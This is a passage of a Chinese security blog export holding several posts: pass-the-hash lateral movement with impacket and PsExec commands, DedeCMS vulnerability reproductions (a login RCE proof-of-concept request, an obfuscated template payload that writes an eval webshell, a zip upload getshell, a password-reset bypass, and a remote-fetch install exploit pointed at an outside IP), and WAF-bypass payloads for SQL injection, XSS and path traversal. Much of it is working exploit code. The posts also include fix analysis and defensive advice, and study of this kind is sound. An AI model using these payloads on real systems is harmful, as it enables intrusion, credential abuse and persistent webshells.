\\\\DC01.wanyue.com delete update // 在域控上立即删除该服务或者直接连接域控,在本地计算机上创建一个网络驱动器z:映射到域控的c:。net use z: \\\\192.168.0.1\\c$ 成功之后会弹出一个弹窗，在弹窗输入命令执行即可 ②impacket一般都是在本地打 wmiexec（比psexec隐蔽,使用wmiexec进行横向移动的时候，Windows操作系统默认不会将WMI的操作记录在日志中） 12wmiexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;如：python wmiexec.py -hashes &quot;:cb0a99e1c922b84b1b632df155665470&quot; wanyue/administrator@192.168.0.1 注意要把防火墙关了 atexec12atexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt; &quot;command&quot;如：python atexec.py -hashes &quot;:cb0a99e1c922b84b1b632df155665470&quot; wanyue/administrator@192.168.0.1 whoami psexec psexec远程运行需要远程计算机启用文件和打印共享且默认的Admin$共享映射到C:windows目录。 psexec建立连接之后目标机器上会被安装一个PSEXESVC服务。但是psexec安全退出之后这个服务会自动删除（在命令行下使用exit命令退出） exe版的似乎没有-hashes这个参数，所以只能用明文密码 1PsExec64.exe \\\\192.168.0.1 -u administrator -i -p Admin111 cmd 还有py版的 12psexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;如：python psexec.py wanyue/administrator@192.168.0.1 -hashes &quot;:cb0a99e1c922b84b1b632df155665470&quot; ③利用msf的psexec模块12345use exploit/windows/smb/psexec_pshset smbdomain 域名set smbuser usernmaeset smbpass passwordrun （这个没有实验过，在set smbpass password，这个命令里的password似乎可以用hash值代替，还有CS也可以PTH） ④利用wmiexec.exe下载地址：https://github.com/maaaaz/impacket-examples-windows 1wmiexec.exe -hashes &quot;:cb0a99e1c922b84b1b632df155665470&quot; WANYUE/Administrator@192.168.0.1 &quot;dir&quot; PTH攻击的防御目前还没有完全可以防御PTH的手法，要使得不被PTH攻击的第一步就是避免攻击者获得自身主机hash值。 打补丁其实是防御的一个好方法，虽然并不能完全防御，但是一般权限的用户就不能PTH了。记住就算打了补丁也要记得把sid=500的管理员账户禁用了。 KB2871997补丁的特点参考链接：https://blog.csdn.net/ping_pig/article/details/121228950、https://www.freebuf.com/column/220740.html 注意：安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存不保存明文的密码。 ① 支持受保护用户组 Protected Users组是一个新的域全局安全组，所属用户会被强制要求使用Kerberos认证，可以避免PTH攻击。注意：真正影响PTH的因素是UAC。 ② 远程桌面客户端支持 Restricted Admin RDP 模式 受限管理员模式能够避免发送明文，服务端也不会缓存用户凭据，但是这种方式也可以增加了新的攻击路径，即可以以pth的方式向远处桌面服务器发起认证。 ③ LSA 凭据清理和其他更改 从 LSASS 中删除明文凭据 用户注销后，凭据将始终从内存中清除 具体更改为： 1、 支持“ProtectedUsers”组； 2、 Restricted Admin RDP模式的远程桌面客户端支持； 3、 注销后删除LSASS中的凭据； 4、 添加两个新的SID； 5、 LSASS中只允许wdigest存储明文密码。 那在打了补丁之后对PTH的防御方法就有: 1、 将FilterAdministratorToken的值设置为1，限制本地administrator账户的远程； 2、 可以使用脚本或者人工定时查看LocalAccountTokenFilterPolicy是否曾经被攻击者修改过； 3、 在组策略中的“拒绝从网络访问这台计算机”将需要限制的组、用户加入到列表中。","categories":[{"name":"渗透","slug":"渗透","permalink":"https://qingwan.top/categories/%E6%B8%97%E9%80%8F/"}],"tags":[],"author":"Qingwan"},{"title":"DedeCMS远程代码执行复现 （CVE-2022-35516）","slug":"DedeCMS远程代码执行复现 （CVE-2022-35516）","date":"2024-01-08T07:50:31.021Z","updated":"2024-01-08T07:54:08.839Z","comments":true,"path":"2024/01/08/DedeCMS远程代码执行复现 （CVE-2022-35516）/","link":"","permalink":"https://qingwan.top/2024/01/08/DedeCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%20%EF%BC%88CVE-2022-35516%EF%BC%89/","excerpt":"Dedecms框架漏洞复现⑤","text":"Dedecms框架漏洞复现⑤ 漏洞影响范围dedecms 5.7.93 - 5.7.96 漏洞分析DedeCMS v5.7.93在/dede/login. php文件中增加了登录失败锁功能，以符合相关的Web安全法规。当用户登录失败时，失败消息将写入文件/data/login.data.php，以记录该用户登录失败的次数。 我们看下login.php的关键代码，在我们登录的时候并没有验证用户名，就直接写入了文件这里我们看到，如果我们连续登录失败，会将 $arr_login 在 json_encode 后写入文件/data/login.data.php中，写入内容有用户名，次数，时间，这里我们就可以通过给用户名赋值恶意代码导致RCE dedecms 会对进入程序的所有变量进行一次过滤，比如这里的 $userid，过滤的具体代码位于 /include/common.inc.php这里对变量使用了addslashes() 函数，按理来说我们写入了&#39;;phpinfo();?&gt; 存到文件中之后，会转变成 \\&#39;;phpinfo();?&gt;，这样我们的&#39;就被转义了，就无法闭合之前的单引号。但是这里的问题出在我们的登录信息存到文件中的时候是经过json_encode的，json_encode 会转义 /\\ 等字符。所以最后变成了&#39;;phpinfo();?&gt; -&gt; \\&#39;;phpinfo();?&gt; -&gt; \\\\&#39;;phpinfo();?&gt;这里又将转义字符转义回去了，所以我们的&#39;也会起到转换的作用，进而闭合，进行RCE 漏洞复现访问登录页面，然后输入用户名&#39;;phpinfo();?&gt;&#39; 我在登录第二次的时候，就看到闪过了phpinfo的界面 我们发现在网站目录下确实生成了login.data.php&#96;这个文件访问一下这个文件所以POC为 123456POST /dede/login.php HTTP/1.1Host: dedecms5793Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=e9ag7oevkh77gnko3cdmt7mbc2dopost=login&amp;userid=%5C%27.phpinfo%28%29%3B%3F%3E&amp;pwd=1234&amp;validate=hw0k 修补方法在 5.7.97 中， login.php 中对应的代码变成了下面这样此处添加了$res==-1这个比较，就要求我们登录的用户名必须是经过注册了的，如果不存在，将会直接退出而不会写入文件中这里修复之后其实还可以进行绕过，详细可以看这篇文章 思考 这里由于单引号和双引号的作用，比如我们想执行whoami命令，我们就不能使用system(&#39;whoami&#39;);这些命令执行的函数了，因为他们写到文件里面之后会变成 system(\\\\&#39;whoami\\\\&#39;);，这时候会进行报错，因为我们不能在函数的头尾的单引号上面使用转义。那这样的话，我们有什么办法去使用我们的函数去执行命令呢 这里就可以使用一些ctf中常见的绕过手法了 回答：①使用反引号 比如 12345echo `whoami`;&#x27;;echo `whoami`;?&gt; //输入的用户名echo `dir`;&#x27;;echo `dir`;?&gt; ②chr()函数+连接符. 12system(chr(119) . chr(104) . chr(111) . chr(97) . chr(109) . chr(105));&#x27;;system(chr(119).chr(104).chr(111).chr(97).chr(109).chr(105));?&gt; //用户名 ③括号(绕过 12(sy.(st).em)(whoami);&#x27;;(sy.(st).em)(whoami);?&gt; //用户名 框架中还有没有其他的地方有类似的写法 回答：目前没有发现","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://qingwan.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[],"author":"Qingwan"},{"title":"DedeCMS v5.7.105 -- RCE复现","slug":"DedeCMS v5.7.105 -- RCE复现","date":"2024-01-08T07:44:46.689Z","updated":"2024-01-08T07:54:14.768Z","comments":true,"path":"2024/01/08/DedeCMS v5.7.105 -- RCE复现/","link":"","permalink":"https://qingwan.top/2024/01/08/DedeCMS%20v5.7.105%20--%20RCE%E5%A4%8D%E7%8E%B0/","excerpt":"Dedecms框架漏洞复现④","text":"Dedecms框架漏洞复现④ 环境搭建漏洞影响版本： &lt;&#x3D;DedeCMS v5.7.105下载dedecms v5.7.105版本或其以下的源码（可以去官网或者GitHub上下载）这里我用的就是5.7.105版本的然后用phpstudy搭建环镜 漏洞复现搭建好环境之后 注册一个账号 然后登录后台第一步，按照下面步骤新建一个模板在下方的框里写上如下内容 123&lt;?php&quot;\\x66\\x69\\x6c\\x65\\x5f\\x70\\x75\\x74\\x5f\\x63\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x73&quot;(&#x27;./shell.php&#x27;, &quot;&lt;?php eva&quot; . &quot;l(\\$_GE&quot; . &quot;T[a]);&quot;);// file_put_contents(&#x27;./shell.php&#x27;, &quot;&lt;?php eval($_GET[a]);&quot;); 第二步，按照下面步骤新建一个页面这里新建页面的时候，主要注意的就是那个文件名的后缀要写成..php，然后模板文件名那里的htm文件，写之前新建模板里的htm（是否编译那里是或者否都可以）这里会把htm文件里的内容写入到新建的php文件里然后访问 1http://localhost/DedeCMS-V5.7.105-UTF8/uploads/a/1.php 此时会在a目录下生成一个shell.php文件内容为: 1&lt;?php eval($_GET[a]);&quot;); 然后测试一下 1http://localhost/DedeCMS-V5.7.105-UTF8/uploads/a/shell.php?a=phpinfo(); 成功利用再测测，确实没问题 漏洞成因分析首先我们看到创建模板页面，看到创建模板的接口调用的是是tpl.php文件 uploads&#x2F;dede&#x2F;tpl.php文件，截取主要的部分然后加了一些注释 12345678910111213141516171819202122232425262728293031323334353637383940414243/* (/\\*)[\\s\\S]*(\\*/)#i 是一个正则表达式模式，表示要匹配的内容。 其中，/\\*和 \\*/表示分别匹配开头的 &quot;/&quot; 和结尾的 &quot;/&quot; 符号，[\\s\\S]* 表示匹配任意空白字符或非空白字符，i 表示忽略大小写。 这个正则表达式的作用是查找 $content 变量中所有以 &quot;/&quot; 开头、以 &quot;/&quot; 结尾的注释，并将其替换为空字符串。这样可以从文本中删除所有的注释内容。 */$content = preg_replace(&quot;#(/\\*)[\\s\\S]*(\\*/)#i&quot;, &#x27;&#x27;, $content);// 黑名单正则匹配，禁了下面这些函数global $cfg_disable_funs;$cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : &#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace&#x27;;$cfg_disable_funs = $cfg_disable_funs.&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;;foreach (explode(&quot;,&quot;, $cfg_disable_funs) as $value) &#123; //将 `$value` 变量中的所有空格字符（包括空格、制表符和换行符等）都删除。 $value = str_replace(&quot; &quot;, &quot;&quot;, $value); /* 该表达式的作用是：如果 `$value` 不为空，并且 `$content` 中存在任意非小写字母字符后跟着 `$value` 的单引号 或双引号，然后紧接着零个或多个空格字符和左括号（圆括号、方括号、大括号）时，则条件成立，即字符串匹 配指定的正则表达式。 */ if(!empty($value) &amp;&amp; preg_match(&quot;#[^a-z]+[&#x27;\\&quot;]*&#123;$value&#125;[&#x27;\\&quot;]*[\\s]*[([&#123;]#i&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123; $content = dede_htmlspecialchars($content); die(&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$content&#125;&lt;/pre&gt;&quot;); &#125; &#125; /* 如果 `$content` 的开头部分包含 &quot;&lt;?&quot;、&quot;&lt;?php&quot; 或 &quot;&lt;?=&quot; 等 PHP 代码标识符，并且标识符后跟着一个或多个空 白字符，则条件成立。即就是匹配php代码的头 */ if(preg_match(&quot;#^[\\s\\S]+&lt;\\?(php|=)?[\\s]+#i&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123; // 这里的U为惰性匹配 // 匹配函数变量执行，例如$a=&quot;phpinfo&quot;，则$a()就会被匹配 if(preg_match(&quot;#[$][_0-9a-z]+[\\s]*[(][\\s\\S]*[)][\\s]*[;]#iU&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123; $content = dede_htmlspecialchars($content); die(&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$content&#125;&lt;/pre&gt;&quot;); &#125; // 就是在上一个匹配前加了一个@，防止报错 if(preg_match(&quot;#[@][$][_0-9a-z]+[\\s]*[(][\\s\\S]*[)]#iU&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123; $content = dede_htmlspecialchars($content); die(&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$content&#125;&lt;/pre&gt;&quot;); &#125; // 匹配反引号`，防止命令执行 if(preg_match(&quot;#[`][\\s\\S]*[`]#i&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123; $content = dede_htmlspecialchars($content); die(&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$content&#125;&lt;/pre&gt;&quot;); &#125; &#125; 然后这些过滤不算很严格，我们还是有很多方法可以去绕过的，比如我们上面的漏洞复现的时候写入的代码就可以绕过这些限制然后看到编辑模板的地方可以看到这里要求我们的模板结尾必须是.htm，而且还将一些表单标签的关键字进行了替换 12345678910111213141516171819202122232425else if($action == &#x27;saveedit&#x27;) &#123; csrf_check(); if($filename == &#x27;&#x27;) &#123; ShowMsg(&#x27;未指定要编辑的文件或文件名不合法&#x27;, &#x27;-1&#x27;); exit(); &#125; if(!preg_match(&quot;#\\.htm$#&quot;, $filename)) &#123; ShowMsg(&#x27;DEDE模板文件，文件名必须用.htm结尾！&#x27;, &#x27;-1&#x27;); exit(); &#125; $content = stripslashes($content); $content = preg_replace(&quot;/##textarea/i&quot;, &quot;&lt;textarea&quot;, $content); $content = preg_replace(&quot;/##\\/textarea/i&quot;, &quot;&lt;/textarea&quot;, $content); $content = preg_replace(&quot;/##form/i&quot;, &quot;&lt;form&quot;, $content); $content = preg_replace(&quot;/##\\/form/i&quot;, &quot;&lt;/form&quot;, $content); $truefile = $templetdird.&#x27;/&#x27;.$filename; $fp = fopen($truefile, &#x27;w&#x27;); fwrite($fp, $content); fclose($fp); ShowMsg(&#x27;成功修改或新建文件&#x27;, &#x27;templets_main.php?acdir=&#x27;.$acdir); exit(); &#125; 然后看到新建页面的源码templets_one_add.php前面都是在对新建页面的内容进行一个处理，我们在新建页面的时候并没有另外写内容，所以前面都不用管，我们看到这里对新建页面进行了一个保存那我们就来到uploads/include/arc.sgpage.class.php的SavaToHtml方法。这个函数主要作用是将当前对象的内容保存为HTML文件。然后进入uploads/include/dedetag.class.php的SaveTo方法，这个函数的作用是将替换后的字符串保存到指定的文件中，即获取文件内容。最后看到GetResult方法，这个方法用于替换模板内容中的字符串，即将一个字符串中的特定标签替换为对应的值，然后返回替换后的字符串。这个漏洞的成因简单来说，就是没有对用户新建的文件的名字是否合法做出判断，而且对文件内容的过滤也不完全，所以导致用户可以通过恶意输入进行利用。","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://qingwan.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[],"author":"Qingwan"},{"title":"DedeCMS v5.7 SP2后台文件上传getshell（CVE-2019-8362）","slug":"DedeCMS v5.7 SP2后台文件上传getshell（CVE-2019-8362）","date":"2024-01-08T07:41:22.038Z","updated":"2024-01-08T07:44:30.663Z","comments":true,"path":"2024/01/08/DedeCMS v5.7 SP2后台文件上传getshell（CVE-2019-8362）/","link":"","permalink":"https://qingwan.top/2024/01/08/DedeCMS%20v5.7%20SP2%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%EF%BC%88CVE-2019-8362%EF%BC%89/","excerpt":"Dedecms框架漏洞复现③","text":"Dedecms框架漏洞复现③ 版本影响：Dedecms v5.7 sp2 漏洞原理分析简要的一句话来说这个漏洞的形成原因就是：上传zip文件解压缩时，对于zip文件中的文件后缀过滤不严格，导致getshell 首先分析下源码，我们看到这个路径下的album_add.php文件中队上传的zip文件中图片的过滤 看到对后缀名的过滤这里，看到是用了一个函数 1$fm-&gt;GetMatchFiles($tmpzipdir,&quot;jpg|png|gif&quot;,$imgs); 那我们进入这个函数看一下这里对后缀名的限制主要是由于那个正则表达式，我们来分析一下这个正则 1preg_match(&quot;/\\.(&quot;.$fileexp.&quot;)/i&quot;,$filename) \\.：匹配一个点号（.）。点号在正则表达式中需要转义，因为它是一个特殊字符，表示任意字符的通配符。这个正则表达式的作用是在字符串 $filename 中寻找以 “jpg”、”png” 或 “gif” 为扩展名的文件。如果匹配成功，preg_match() 函数会返回 1，否则返回 0但是这里就有一个bug，就是只要他在我们的文件名中匹配到了.jpg、.png、.gif则视为匹配成功，这样的话我们就可以用1.jpg.php这个格式进行绕过，从而导致任意文件上传 漏洞复现首先官网下载对应版本的源码之后，解压到phpstudy中，然后访问/DedeCMS-V5.7-UTF8-SP2/uploads/install/index.php进行程序的安装，之后登录的用户名和密码都用默认的管理员的admin登录即可然后我们创建一个1.jpg.php文件，里面写入phpinfo或者写入一句话木马 1&lt;?php phpinfo();?&gt; 然后将这个文件压缩上传到文件式管理器的soft目录下 然后我们先去网站栏目管理这里去随便创建一个图片集栏目 创建完成之后，我们访问/DedeCMS-V5.7-UTF8-SP2/uploads/dede/album_add.php，选择从 从ZIP压缩包中解压图片 然后发布，发布成功之后选择预览文档复现成功 漏洞修补这里我一开始想的修补方式是将正则改为，将文件名的最后几个字符和允许的后缀名进行匹配，而不是对整个文件名都进行匹配。然后我看了已经修复的版本，最后的修复方法如下，只有这个函数的定义的最后一句不一样，这里替换了正则用了in_array()函数，函数定义如下 1function in_array(mixed $needle, array $haystack, bool $strict = false): bool &#123;&#125; 这个函数的作用是在 $haystack 数组中搜索是否存在与 $needle 值相等的元素，如果存在则返回 true，否则返回 false。在给定的代码中，in_array() 函数用于判断文件的扩展名是否存在于分割后的扩展名数组中，即 $needle 是文件的扩展名，$haystack是扩展名数组。这里的 1pathinfo($filename, PATHINFO_EXTENSION) 直接取的文件的后缀名去和数组里允许的那三个后缀名进行对比，进而防止了1.jpg.php这种绕过手法 复现过程中问题在我第一次发布的时候，发现一直有报错 1把数据保存到数据库附加表 dede_addonimages 时出错，请把相关信息提交给DedeCMS官方。You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;row,col,isrm,ddmaxwidth,pagepicnum,body) Values(&#x27;4&#x27;,&#x27;2&#x27;,&#x27;&#x27;,&#x27;0.0.&#x27; at line 1 最后通过这篇文章提到的方法解决，主要就是版本问题我们需要给关键字加上反引号","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://qingwan.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[],"author":"Qingwan"},{"title":"DeDeCMS v5.7 SP2 前台任意用户密码修改漏洞复现","slug":"DeDeCMS v5.7 SP2 前台任意用户密码修改漏洞复现","date":"2024-01-08T07:37:00.246Z","updated":"2024-01-08T07:40:47.603Z","comments":true,"path":"2024/01/08/DeDeCMS v5.7 SP2 前台任意用户密码修改漏洞复现/","link":"","permalink":"https://qingwan.top/2024/01/08/DeDeCMS%20v5.7%20SP2%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"Dedecms框架漏洞复现②","text":"Dedecms框架漏洞复现② 漏洞影响范围DeDeCMS v5.7 SP2 (只影响前台用户) 利用成功前提条件 开启会员模块 攻击者拥有一个正常的会员账号 目标没有设置安全问题 漏洞利用首先下载安装好dedecms v5.7 sp2(tips:我用phpstudy搭建的，这里记得网站php版本调低一点，我一开始用的php7会报错，调成php5就正常了)然后我们点开会员设置，打开会员功能打开会员功能，注册一个账号，这里一定要记住不要设置安全问题查看一下我们刚刚注册的用户的id输入下面这个url，进入修改信息网站，然后抓包localhost/DedeCMS-V5.7-UTF8-SP2/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=2看到这里有个key=Bp7DfL6是临时验证码拿到这个临时key之后就可以修改密码了所以如果我们知道一个会员用户名，并且这个用户没有设置安全问题，同时我们知道他的id，就可以任意修改他的密码了 漏洞分析这里修改用户名密码，有两种方式，一种是通过邮箱验证去修改，另外一种是通过安全问题去修改，这里就是利用了安全问题修改用户名密码的漏洞看到/upload/member/resetpassword.php页面用安全问题验证这里，经过两个if判断之后，就进入了sn函数，这个函数就是我们的修改密码的函数在没有设置安全问题和答案时，safequestion=0，safeanswer=null（为空）所以0.0==0为true，&#39;&#39;==null为true，成功绕过，而且从上图可知，此时的send为Nsn函数的定义如下从之前可知，我们的send为N，则就不发送邮箱验证码，接下来看到newmail这个函数我们来到send为N之后的逻辑，可以看到这里返回了我们漏洞复现中修改密码的url，需要我们的id还有临时验证码key所以最终为：/member/resetpassword.php（safequestion）-&gt; /member/resetpassword.php（sn）-&gt; /member/inc/inc_pwd_functions.php（newmail） 修复建议最后的修复，就是把弱等于==，改为强等于=== 12345678910111213// member/resetpassword.phpelse if($dopost == &quot;safequestion&quot;) &#123; // ... if(empty($safequestion)) $safequestion = &#x27;&#x27;; if(empty($safeanswer)) $safeanswer = &#x27;&#x27;; // TODO: https://xz.aliyun.com/t/1927 已经修复，任意密码重置，弱类型 if ($row[&#x27;safequestion&#x27;] === $safequestion &amp;&amp; $row[&#x27;safeanswer&#x27;] === $safeanswer) &#123; sn($mid, $row[&#x27;userid&#x27;], $row[&#x27;email&#x27;], &#x27;N&#x27;); exit(); &#125; // ...&#125;","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://qingwan.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[],"author":"Qingwan"},{"title":"DedeCMS v5.81 beta -- common.func.php RCE","slug":"dedecms-common.func.php RCE","date":"2024-01-08T07:33:54.898Z","updated":"2024-01-08T07:36:31.352Z","comments":true,"path":"2024/01/08/dedecms-common.func.php RCE/","link":"","permalink":"https://qingwan.top/2024/01/08/dedecms-common.func.php%20RCE/","excerpt":"Dedecms框架漏洞复现①","text":"Dedecms框架漏洞复现① 漏洞成因漏洞主要的成因在于install/index.php文件的这一段（如果安装初始化了网站，那就是install/index.php.bak这个文件）这里其实涉及到一个Apache解析漏洞 当Apache检测到一个文件有多个扩展名时，如index.php.bak，会从右向左判断，直到有一个Apache认识的扩展名。所以这里的Index.php.bak也会被当作php文件进行解析 首先看到文件开头的If语句 123if (file_exists(INSLOCKFILE)) &#123; exit(&quot; 程序已运行安装，如果你确定要重新安装，请先从FTP中删除 install/install_lock.txt！&quot;); &#125; 由于我们要执行下面的语句，所以我们要想办法绕过这里的exit()这里我们给INSLOCKFILE赋任意值，只要是不存在的文件就可以，当insLockfile指定的文件不存在时程序就会认为没有初始化过，就会继续执行初始化代码。然后我们来到第十一步：step=11 1234567891011121314else if($step==11) &#123; include_once &#x27;../data/admin/config_update.php&#x27;; $rmurl = UPDATEHOST.&quot;dedecms/demodata.&#123;$s_lang&#125;.txt&quot;; $sql_content = file_get_contents($rmurl); $fp = fopen(INSTALL_DEMO_NAME, &#x27;w&#x27;); if(fwrite($fp, $sql_content)) &#123; echo &#x27;&amp;nbsp; &lt;font color=&quot;green&quot;&gt;[√]&lt;/font&gt; 存在(您可以选择安装进行体验)&#x27;; &#125; else &#123; echo &#x27;&amp;nbsp; &lt;font color=&quot;red&quot;&gt;[×]&lt;/font&gt; 远程获取失败&#x27;; &#125; unset($sql_content); fclose($fp); exit(); &#125; 这段代码的作用是从指定URL下载数据并将其写入指定的文件。那如果我们在我们的服务器上，放上一个恶意的文件，然后利用这段代码去下载，那不就可以RCE了嘛 漏洞复现我们先根据指引，初始化网站然后在我们的服务器上先新建一个dedecms文件夹然后在里面新建一个demodata.aaa.txt文件，里面写入一句话木马然后访问链接 1http://localhost/DedeCMS-5.8.1/install/index.php.bak?insLockfile=aaa&amp;step=11&amp;install_demo_name=./a.php&amp;updateHost=http://1.14.60.36:9000/ 之后用户就会下载我们的一句话木马到当前目录下的a.php文件中我们提交参数?updataHost=http://1.14.60.36:9000/ $rumurl就会等于http://192.168.18.131/dedecms/demodata.utf-8.txt（$s_lang等于utf-8或gbk，可以在前端查看，在这里也可以传递一个参数把$s_lang覆盖）。同时提交参数?install_demo_name=./a.php,我们的利用代码就会写在/install/t.php中。 我们访问 1http://localhost/DedeCMS-5.8.1/install/a.php?a=phpinfo(); 即可进行RCE 漏洞修复在安装完成后移除install目录。 参考文章https://www.exploit-db.com/exploits/37423","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://qingwan.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[],"author":"Qingwan"},{"title":"了解WAF&WAF的绕过","slug":"了解WAF&WAF的绕过","date":"2024-01-08T07:25:29.700Z","updated":"2024-01-12T04:58:20.516Z","comments":true,"path":"2024/01/08/了解WAF&WAF的绕过/","link":"","permalink":"https://qingwan.top/2024/01/08/%E4%BA%86%E8%A7%A3WAF&WAF%E7%9A%84%E7%BB%95%E8%BF%87/","excerpt":"关于一些对WAF的了解以及WAF的绕过","text":"关于一些对WAF的了解以及WAF的绕过 WAF的介绍WAF( Web Application Firewall ) Web应用防火墙，部署在web应用程序前面，在用户请求到达web服务器前对用户请求进行扫描和过滤，分析并校验每个用户请求的网络包，确保每个用户请求有效且安全，对无效或有攻击行为的请求进行阻断或隔离。通过检查HTTP流量，可以防止源自web应用程序的安全漏洞（如注入漏洞、XSS漏洞、命令执行漏洞、文件包含漏洞等）的攻击。 WAF的工作原理WAF的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录 1. 预处理预处理阶段首先在接收到数据请求流量时会先判断是否为HTTP&#x2F;HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Web服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。 2. 规则检测每一种WAF产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。 3. 处理模块针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端Web服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。不同的WAF产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款WAF产品，从而有目的性的进行WAF绕过。这个网站收录了一些常见的WAF产品的界面 4. 日志记录WAF在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。 WAF的分类1.硬件型WAF（产商安装）（绿盟、深信服）：以硬件形式部署在链路中串联在内网的交换机上，防护范围大 2.云WAF（阿里云，腾讯云，华为云….)：通过配置NS或者CNAME记录，使得对网站的请求报文优先经过WAF主机，经过WAF主机过滤之后，将被认为无害的请求报文再送给实际的网站服务器进行请求 （比如学校的第二课堂就用了深信服的云安全产品，不一定是WAF）基于云端的检测，安装简单，修改 DNS 解析或在服务器安装云 WAF 的模块即可 3.软件型WAF（部署在Apache，Nginx等HTTPServer中）（安全狗、D盾、云锁等）以软件的形式安装在服务器上安装在服务器上，根据网站流量决定占用内存量 4.自定义WAF（自己写的一些规则）在系统后台内置一项安全功能以便管理者使用 WAF的判断–工具&#x2F;手动1.sqlmap如果网站有waf的话，我们在使用sqlmap对这个网站进行扫描的时候会有提示（含有很多payload的字典，然后其中有的payload触发了网站的waf，故waf也不一定会被触发）比如： 1python sqlmap.py -u &quot;https://www.cuit.edu.cn/&quot; 2.Wafw00fkali下自带 1wafwoof https://baidu.com 3.手动测试HTTP 请求包分析响应数据通过对网站的正常访问，查看响应的头部信息。例如在 X-Powered-By 内显示 “anyu.qianxin.com” 的标识，代表安装了奇安信安域 WAF比如：这个 网站用了奇安信的产品，我们就可以把他抓包来验证一下 请求恶意字符分析响应或敏感页面比如阿里云盾（aliyundun）我们用一个网站测试一下我们输入一个敏感的路径 1?shopId=&#x27;bin/cat/etc/passwd; ping 127.0.0.1; curl google.com&#x27; 然后可以看到页面出现了阿里云盾的防火墙拦截页面 WAF的绕过检测规则绕过waf工程师规则编写经验、规则覆盖面等问题，来绕过检测，例如利用 MySQL对一些特殊字符处理的特性、语法特性绕过；（但是随着waf的发展，现在在检测规则已经比较全面了，常见的waf一般用这些规则都绕不过去了）1.大小写绕过 1http://example.com/index.php?page_id=-1 UnIoN SeLeCT 1,2,3,4 2.URL编码技术 1被WAF阻止：UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)绕过的技术：UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29 3.Unicode技术 12../../etc/shadow混淆：%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow 4.HTML编码技术 123&quot;&gt;&lt;img src=x onerror=confirm()&gt;实体名称有效载荷：&amp;quot;&amp;gt;&amp;lt;img src=x onerror=confirm&amp;lpar;&amp;rpar;&amp;gt;实体编码有效载荷：&amp;#34;&amp;#62;&amp;#60;img src=x onerror=confirm&amp;#40;&amp;#41;&amp;#62; 5.使用注释技术 12345&lt;script&gt;confirm()&lt;/script&gt;绕过的技术：&lt;!--&gt;&lt;script&gt;confirm/**/()/**/&lt;/script&gt;被WAF阻止：/?id=1+union+select+1,2--绕过的技术：/?id=1+un/**/ion+sel/**/ect+1,2-- 6.通配符混淆技术 12&lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;javascript:confirm()&quot;&#x27;;&gt;混淆负载&lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;jav&quot;+&quot;as&amp;Tab;cr&quot;+&quot;ipt:con&quot;+&quot;fir&quot;+&quot;m()&quot;&#x27;;&gt; 7.宽字节 12345union = uю%69яю这里把i不用宽字节 直接url编码 其他的字符都用对应的宽字节select = こхlх%уt //t不编码 其他的都宽字节 中间插上%from = цR%яэ //宽字节+%空格=%20=%ва //в是2的款字符 а是0的宽字符, = Ь //,号的宽字节 8.00截断绕过 